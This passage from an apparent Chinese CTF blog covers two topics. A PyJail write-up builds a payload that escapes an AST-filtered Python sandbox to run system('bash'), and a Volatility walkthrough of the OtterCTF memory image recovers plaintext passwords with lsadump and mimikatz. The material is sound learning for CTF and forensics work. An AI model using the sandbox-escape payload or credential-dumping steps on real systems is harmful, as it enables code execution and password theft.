class="number">4</span>))</span><br></pre></td></tr></table></figure></div><p>AST 如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Module(</span><br><span class="line">    body=[</span><br><span class="line">        Match(</span><br><span class="line">            subject=Call(</span><br><span class="line">                func=Name(<span class="built_in">id</span>=<span class="string">&#x27;str&#x27;</span>, ctx=Load()),</span><br><span class="line">                args=[],</span><br><span class="line">                keywords=[]),</span><br><span class="line">            cases=[</span><br><span class="line">                match_case(</span><br><span class="line">                    pattern=MatchClass(</span><br><span class="line">                        cls=Name(<span class="built_in">id</span>=<span class="string">&#x27;str&#x27;</span>, ctx=Load()),</span><br><span class="line">                        patterns=[],</span><br><span class="line">                        kwd_attrs=[</span><br><span class="line">                            <span class="string">&#x27;__class__&#x27;</span>],</span><br><span class="line">                        kwd_patterns=[</span><br><span class="line">                            MatchAs(name=<span class="string">&#x27;x&#x27;</span>)]),</span><br><span class="line">                    body=[</span><br><span class="line">                        Expr(</span><br><span class="line">                            value=Call(</span><br><span class="line">                                func=Name(<span class="built_in">id</span>=<span class="string">&#x27;print&#x27;</span>, ctx=Load()),</span><br><span class="line">                                args=[</span><br><span class="line">                                    Name(<span class="built_in">id</span>=<span class="string">&#x27;x&#x27;</span>, ctx=Load())],</span><br><span class="line">                                keywords=[]))])])],</span><br><span class="line">    type_ignores=[])</span><br></pre></td></tr></table></figure></div><p>可以看到确实没有 Attribute，依据这个原理，就可以绕过 ast.Attribute</p><p>我们可以构造替代  <code>''.__class__.__base__.__subclasses__()</code>  的 payload：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">match str():</span><br><span class="line">    case object(__class__=clazz):</span><br><span class="line">        match clazz:</span><br><span class="line">            case object(__base__=bass):</span><br><span class="line">                match bass:</span><br><span class="line">                    case object(__subclasses__=subclazz):</span><br><span class="line">                        print(subclazz)</span><br></pre></td></tr></table></figure></div><h4 id="绕过-astassign-赋值变量"><a class="markdownIt-Anchor" href="#绕过-astassign-赋值变量">#</a> 绕过 ast.Assign 赋值变量</h4><p>ast.Assign 无法使用时，我们无法直接使用 = 来进行赋值，此时可以使用海象表达式:= 进行绕过。例如：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    system:=<span class="number">111</span>,</span><br><span class="line">    bash:=<span class="number">222</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure></div><p>此时 AST 树如下，海象表达式用到的是 ast.NamedExpr 而非 ast.Assign</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Module(</span><br><span class="line">    body=[</span><br><span class="line">        Expr(</span><br><span class="line">            value=<span class="type">List</span>(</span><br><span class="line">                elts=[</span><br><span class="line">                    NamedExpr(</span><br><span class="line">                        target=Name(<span class="built_in">id</span>=<span class="string">&#x27;system&#x27;</span>, ctx=Store()),</span><br><span class="line">                        value=Constant(value=<span class="number">111</span>)),</span><br><span class="line">                    NamedExpr(</span><br><span class="line">                        target=Name(<span class="built_in">id</span>=<span class="string">&#x27;bash&#x27;</span>, ctx=Store()),</span><br><span class="line">                        value=Constant(value=<span class="number">222</span>))],</span><br><span class="line">                ctx=Load()))],</span><br><span class="line">    type_ignores=[])</span><br></pre></td></tr></table></figure></div><h4 id="绕过-astconstant-获取数字-字符串"><a class="markdownIt-Anchor" href="#绕过-astconstant-获取数字-字符串">#</a> 绕过 ast.Constant 获取数字、字符串</h4><p>题目限制了 ast.Constant，所以无法直接使用数字、字符串常量，但通过其他的函数组合可以构造出数字和字符串。 例如：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span> : <span class="built_in">str</span>()</span><br><span class="line"><span class="number">0</span>  : <span class="built_in">len</span>([])</span><br><span class="line"><span class="string">&quot;0&quot;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>([]))</span><br><span class="line"><span class="string">&quot;1&quot;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">str</span>()])) 或 <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">min</span>]))</span><br><span class="line"><span class="string">&quot;2&quot;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">str</span>(),<span class="built_in">str</span>()])) 或 <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">min</span>,<span class="built_in">max</span>]))</span><br><span class="line"><span class="string">&#x27;A&#x27;</span>: <span class="built_in">chr</span>(<span class="built_in">len</span>([<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>])*<span class="built_in">len</span>([<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>]))</span><br></pre></td></tr></table></figure></div><p>如果要用数字来构造字符串，通常需要用到 chr 函数，虽然题目的 builtins 没有直接提供 chr 函数，但也可以自己手动实现一个 chr。</p><p>当然，题目 builtins 允许 dict 和 list，因此可以直接用这两个函数直接构造出字符串</p><p>在这个 payload 中，需要构造出 _wrap_close、system、bash</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;bash&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>那么就可以通过下面的方式获取到这几个字符串：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(system=[]))[<span class="number">0</span>]            <span class="comment"># system</span></span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(_wrap_close=[]))[<span class="number">0</span>]       <span class="comment"># _wrap_close</span></span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(bash=[]))[<span class="number">0</span>]              <span class="comment"># bash</span></span><br></pre></td></tr></table></figure></div><h4 id="绕过-astsubscript-获取列表字典元素"><a class="markdownIt-Anchor" href="#绕过-astsubscript-获取列表字典元素">#</a> 绕过 ast.Subscript 获取列表 / 字典元素</h4><p>题目同时限定了 ast.Subscript，因此无法直接使用索引。但 BUILTINS 中给出了 min 函数，该函数可以获取列表中最小的元素，当列表中只有一个元素时，就可以直接取值。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(system=[])))            <span class="comment"># system</span></span><br><span class="line"><span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(_wrap_close=[])))       <span class="comment"># _wrap_close</span></span><br><span class="line"><span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(bash=[])))              <span class="comment"># bash</span></span><br></pre></td></tr></table></figure></div><p>如果要获取字典元素，可以利用 get 函数来替代 Subscript。例如我需要在 globals 字典中获取 key 为 system 的元素，可以配合 match/case 来获取。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">globals</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">object</span>(get=get_func):</span><br><span class="line">        get_func(<span class="string">&quot;system&quot;</span>)</span><br></pre></td></tr></table></figure></div><h4 id="绕过-astfor-遍历列表"><a class="markdownIt-Anchor" href="#绕过-astfor-遍历列表">#</a> 绕过 ast.For 遍历列表</h4><p>在构造最终 payload 中，我们还需要在  <code>__subclasses__()</code>  得到的列表中获取到 _wrap_close 类。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;bash&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>当列表中不只有一个元素且列表中的元素之间无法比较时，正常情况下可以使用 for 来遍历并判断，但 ast.For 被题目过滤了，此时可以使用 filter，如下所示：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filter_func</span>(<span class="params">subclazzes_item</span>):</span><br><span class="line">    [ _wrap_close:=<span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(_wrap_close=[])))]</span><br><span class="line">    <span class="keyword">match</span> subclazzes_item:</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">object</span>(_＿name_＿=name):</span><br><span class="line">            <span class="keyword">if</span> name==_wrap_close:</span><br><span class="line">                <span class="keyword">return</span> subclazzes_item</span><br><span class="line">[</span><br><span class="line">    subclazzes_item:=<span class="built_in">min</span>(<span class="built_in">filter</span>(filter_func,subclazzes()))</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div><p>fitler 中使用 match/case 和 if 来进行过滤。</p><p>除了使用 filter 函数外，还可以使用 iter 和 next 函数来遍历列表，但题目 BUILTINS 中没有给出这两个函数。</p><h2 id="end"><a class="markdownIt-Anchor" href="#end">#</a> END</h2><p>贴一个自动化的 Python 沙箱逃逸 payload bypass 框架，不知道将来用不用得到</p><p><a class="link" href="https://github.com/Macr0phag3/parselmouth">GitHub - Macr0phag3/parselmouth <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pyjail&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pyjail&quot;&gt;#&lt;/a&gt; PyJail&lt;/h1&gt;
&lt;h2 id=&quot;python的一些特性&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pytho</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Volatility</title>
    <link href="http://example.com/2024/04/27/Volatility/"/>
    <id>http://example.com/2024/04/27/Volatility/</id>
    <published>2024-04-27T13:21:27.000Z</published>
    <updated>2024-04-28T06:01:31.910Z</updated>
    
    <content type="html"><![CDATA[<h1 id="volatility"><a class="markdownIt-Anchor" href="#volatility">#</a> Volatility</h1><h2 id="先以otterctf为例"><a class="markdownIt-Anchor" href="#先以otterctf为例">#</a> 先以 OtterCTF 为例</h2><h3 id="查看镜像信息"><a class="markdownIt-Anchor" href="#查看镜像信息">#</a> 查看镜像信息</h3><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem imageinfo</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/27/KXFZGlghQHNO1pV.png" alt="image.png"></p><p>会存在很多镜像，一般第一个就是对的，可以用下面的命令验证</p><h3 id="调出shell窗口"><a class="markdownIt-Anchor" href="#调出shell窗口">#</a> 调出 shell 窗口</h3><p>可以测试你猜测的系统是否正确，正确的话就能 getshell</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 volshell</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/27/ifqPBN6nQaem9xy.png" alt="image.png"></p><h3 id="获取镜像的用户名密码"><a class="markdownIt-Anchor" href="#获取镜像的用户名密码">#</a> 获取镜像的用户名密码</h3><p>可以使用 hashdump，但得到密码都是哈希加密之后的，使用 lsadump 或者 mimikatz 可以得到明文</p><p>直接利用后两个插件，</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 lsadump</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/27/agyq4mCIkoNDTxf.png" alt="image.png"></p><p><code>vol.py --plugins=/home/kali/Tools/volatility/volatility/plugins -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 mimikatz</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/27/KOo1QvPUIL5SlEN.png" alt="image.png"></p><h3 id="获取ip地址"><a class="markdownIt-Anchor" href="#获取ip地址">#</a> 获取 ip 地址</h3><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 netscan</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/27/xWKpT6HfXEYjmM3.png" alt="image.png"></p><h3 id="获取主机名"><a class="markdownIt-Anchor" href="#获取主机名">#</a> 获取主机名</h3><h4 id="查注册表"><a class="markdownIt-Anchor" href="#查注册表">#</a> 查注册表</h4><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 hivelist</code> 1</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/27/Ru2EskHAVjNKnLS.png" alt="image.png"></p><p>主机名信息在 SYSTEM 的那一条记录中，再用 <code>-o + Virtual printkey</code>  来查看指定的记录</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/27/zX3WmVt7.png" alt="1714225836369.png"></p><p>跟进 ControlSet001</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001&quot;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/27/AmM6lBI3.png" alt="1714225968337.png"></p><p>继续跟进 Control</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001\Control&quot;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/27/nrln55Q5.png" alt="1714226095273.png"></p><p>跟进 ComputerName</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001\Control\ComputerName&quot;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/27/hytyDofb.png" alt="1714226188973.png"></p><p>继续跟进 ComputerName</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/27/VY8kbFyI.png" alt="1714226289670.png"></p><p>到处注册表： <code>hivedump</code></p><h3 id="查看进程"><a class="markdownIt-Anchor" href="#查看进程">#</a> 查看进程</h3><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 pslist</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/27/9MVecqc2.png" alt="1714227976982.png"></p><p>题目要求找到他玩的游戏，排除认识的程序，找不认识的百度一下，这个 lunarMS 就是答案，还需要找出游戏的服务器 ip，用 grep 正则表达</p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/27/VytbGj3H.png" alt="1714231953244.png"></p><h3 id="提取进程"><a class="markdownIt-Anchor" href="#提取进程">#</a> 提取进程</h3><p>1.memdump 将进程以 dmp 文件保存</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 memdump -p 708 -D /home/kali</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/28/y5fOqc3A.png" alt="1714273354650.png"></p><p>在利用 strings 提取字符串找到游戏账号</p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/28/lxorhNOd.png" alt="1714273819021.png"></p><p>2. 提取完整进程</p><p>用 procdump 提取</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 procdump -p 3720 -D /home/kali</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/28/wiWQTqG0.png" alt="1714276933594.png"></p><h3 id="查看剪切板"><a class="markdownIt-Anchor" href="#查看剪切板">#</a> 查看剪切板</h3><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 clipboard</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/28/OG2gk9ul.png" alt="1714274863169.png"></p><p>获得邮箱</p><h3 id="查看进程树"><a class="markdownIt-Anchor" href="#查看进程树">#</a> 查看进程树</h3><p>题目要求找到恶意程序</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 pstree</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/28/cWd85PrG.png" alt="1714275093047.png"></p><p>可以用 dlllist 查看一下进程相关的 dll 文件列表</p><h3 id="查看dll文件列表"><a class="markdownIt-Anchor" href="#查看dll文件列表">#</a> 查看 dll 文件列表</h3><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 dlllist -p 3720</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/28/GVnk8dUj.png" alt="1714275458700.png"></p><p>运行在 temp 中，不太正经，就是题目答案</p><h3 id="扫描文件"><a class="markdownIt-Anchor" href="#扫描文件">#</a> 扫描文件</h3><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 filescan |grep &quot;Rick And Morty&quot;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/28/6P7Ze8HX.png" alt="1714276122628.png"></p><h2 id="volpy"><a class="markdownIt-Anchor" href="#volpy">#</a> <a class="link" href="http://vol.py">vol.py <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -h</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">Options:</span><br><span class="line">  -h, --help            list all available options and their default values.</span><br><span class="line">                        Default values may be set in the configuration file</span><br><span class="line">                        (/etc/volatilityrc)</span><br><span class="line">  --conf-file=/home/kali/.volatilityrc</span><br><span class="line">                        User based configuration file</span><br><span class="line">  -d, --debug           Debug volatility</span><br><span class="line">  --plugins=PLUGINS     Additional plugin directories to use (colon separated)</span><br><span class="line">  --info                Print information about all registered objects</span><br><span class="line">  --cache-directory=/home/kali/.cache/volatility</span><br><span class="line">                        Directory where cache files are stored</span><br><span class="line">  --cache               Use caching</span><br><span class="line">  --tz=TZ               Sets the (Olson) timezone for displaying timestamps</span><br><span class="line">                        using pytz (if installed) or tzset</span><br><span class="line">  -f FILENAME, --filename=FILENAME</span><br><span class="line">                        Filename to use when opening an image</span><br><span class="line">  --profile=WinXPSP2x86</span><br><span class="line">                        Name of the profile to load (use --info to see a list</span><br><span class="line">                        of supported profiles)</span><br><span class="line">  -l LOCATION, --location=LOCATION</span><br><span class="line">                        A URN location from which to load an address space</span><br><span class="line">  -w, --write           Enable write support</span><br><span class="line">  --dtb=DTB             DTB Address</span><br><span class="line">  --shift=SHIFT         Mac KASLR shift address</span><br><span class="line">  --output=text         Output in this format (support is module specific, see</span><br><span class="line">                        the Module Output Options below)</span><br><span class="line">  --output-file=OUTPUT_FILE</span><br><span class="line">                        Write output in this file</span><br><span class="line">  -v, --verbose         Verbose information</span><br><span class="line">  --physical_shift=PHYSICAL_SHIFT</span><br><span class="line">                        Linux kernel physical shift address</span><br><span class="line">  --virtual_shift=VIRTUAL_SHIFT</span><br><span class="line">                        Linux kernel virtual shift address</span><br><span class="line">  -g KDBG, --kdbg=KDBG  Specify a KDBG virtual address (Note: for 64-bit</span><br><span class="line">                        Windows 8 and above this is the address of</span><br><span class="line">                        KdCopyDataBlock)</span><br><span class="line">  --force               Force utilization of suspect profile</span><br><span class="line">  -k KPCR, --kpcr=KPCR  Specify a specific KPCR address</span><br><span class="line">  --cookie=COOKIE       Specify the address of nt!ObHeaderCookie (valid for</span><br><span class="line">                        Windows 10 only)</span><br><span class="line"></span><br><span class="line">        Supported Plugin Commands:</span><br><span class="line"></span><br><span class="line">                amcache         Print AmCache information</span><br><span class="line">                apihooks        Detect API hooks in process and kernel memory</span><br><span class="line">                atoms           Print session and window station atom tables</span><br><span class="line">                atomscan        Pool scanner for atom tables</span><br><span class="line">                auditpol        Prints out the Audit Policies from HKLM\SECURITY\Policy\PolAdtEv</span><br><span class="line">                bigpools        Dump the big page pools using BigPagePoolScanner</span><br><span class="line">                bioskbd         Reads the keyboard buffer from Real Mode memory</span><br><span class="line">                cachedump       Dumps cached domain hashes from memory</span><br><span class="line">                callbacks       Print system-wide notification routines</span><br><span class="line">                clipboard       Extract the contents of the windows clipboard</span><br><span class="line">                cmdline         Display process command-line arguments #显示命令行参数</span><br><span class="line">                cmdscan         Extract command history by scanning for _COMMAND_HISTORY  #提取命令行历史记录（_COMMAND_HISTORY）</span><br><span class="line">                connections     Print list of open connections [Windows XP and 2003 Only]</span><br><span class="line">                connscan        Pool scanner for tcp connections</span><br><span class="line">                consoles        Extract command history by scanning for _CONSOLE_INFORMATION #提取命令行历史记录扫描_CONSOLE_INFORMATION）</span><br><span class="line">                crashinfo       Dump crash-dump information</span><br><span class="line">                deskscan        Poolscaner for tagDESKTOP (desktops)</span><br><span class="line">                devicetree      Show device tree</span><br><span class="line">                dlldump         Dump DLLs from a process address space</span><br><span class="line">                dlllist         Print list of loaded dlls for each process #打印进程的动态链接库列表</span><br><span class="line">                driverirp       Driver IRP hook detection</span><br><span class="line">                drivermodule    Associate driver objects to kernel modules</span><br><span class="line">                driverscan      Pool scanner for driver objects</span><br><span class="line">                dumpcerts       Dump RSA private and public SSL keys</span><br><span class="line">                dumpfiles       Extract memory mapped and cached files</span><br><span class="line">                dumpregistry    Dumps registry files out to disk </span><br><span class="line">                editbox         Displays information about Edit controls. (Listbox experimental.)</span><br><span class="line">                envars          Display process environment variables</span><br><span class="line">                eventhooks      Print details on windows event hooks</span><br><span class="line">                evtlogs         Extract Windows Event Logs (XP/2003 only)</span><br><span class="line">                filescan        Pool scanner for file objects #扫描文件对象信息</span><br><span class="line">                gahti           Dump the USER handle type information</span><br><span class="line">                gditimers       Print installed GDI timers and callbacks</span><br><span class="line">                gdt             Display Global Descriptor Table</span><br><span class="line">                getservicesids  Get the names of services in the Registry and return Calculated SID</span><br><span class="line">                getsids         Print the SIDs owning each process</span><br><span class="line">                handles         Print list of open handles for each process</span><br><span class="line">                hashdump        Dumps passwords hashes (LM/NTLM) from memory #转储内存中的Windows账号密码哈希</span><br><span class="line">                hibinfo         Dump hibernation file information</span><br><span class="line">                hivedump        Prints out a hive #转储注册表配置单元信息</span><br><span class="line">                hivelist        Print list of registry hives. #打印注册表配置单元列表</span><br><span class="line">                hivescan        Pool scanner for registry hives</span><br><span class="line">                hpakextract     Extract physical memory from an HPAK file</span><br><span class="line">                hpakinfo        Info on an HPAK file</span><br><span class="line">                idt             Display Interrupt Descriptor Table</span><br><span class="line">                iehistory       Reconstruct Internet Explorer cache / history #重建IE缓存及访问历史记录</span><br><span class="line">                imagecopy       Copies a physical address space out as a raw DD image</span><br><span class="line">                imageinfo       Identify information for the image  #查看镜像信息</span><br><span class="line">                impscan         Scan for calls to imported functions</span><br><span class="line">                joblinks        Print process job link information</span><br><span class="line">                kdbgscan        Search for and dump potential KDBG values</span><br><span class="line">                kpcrscan        Search for and dump potential KPCR values</span><br><span class="line">                ldrmodules      Detect unlinked DLLs</span><br><span class="line">                lsadump         Dump (decrypted) LSA secrets from the registry</span><br><span class="line">                machoinfo       Dump Mach-O file format information</span><br><span class="line">                malfind         Find hidden and injected code</span><br><span class="line">                mbrparser       Scans for and parses potential Master Boot Records (MBRs) </span><br><span class="line">                memdump         Dump the 